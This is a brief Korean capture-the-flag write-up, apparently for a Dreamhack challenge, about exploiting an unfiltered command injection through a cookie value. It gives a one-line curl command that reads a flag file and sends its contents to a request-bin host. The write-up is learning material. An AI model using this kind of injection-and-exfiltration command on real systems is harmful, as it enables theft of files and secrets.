## 주요 개념

- Command Injection

## 풀이

소스 코드를 보면, 필터링 없이 문자열을 그대로 사용해 쉘 명령어를 입력할 수 있다는 취약점이 존재한다.  
해당 취약점을 이용해 Cookie 값을 다음과 같이 조작하면 flag를 얻어낼 수 있다.
[Dreamhack Tools](https://tools.dreamhack.games)의 Request Bin을 사용해 curl 요청을 받을 수 있다.

```
1 | curl -d $(cat ./flag) https://example.request.dreamhack.games/
```
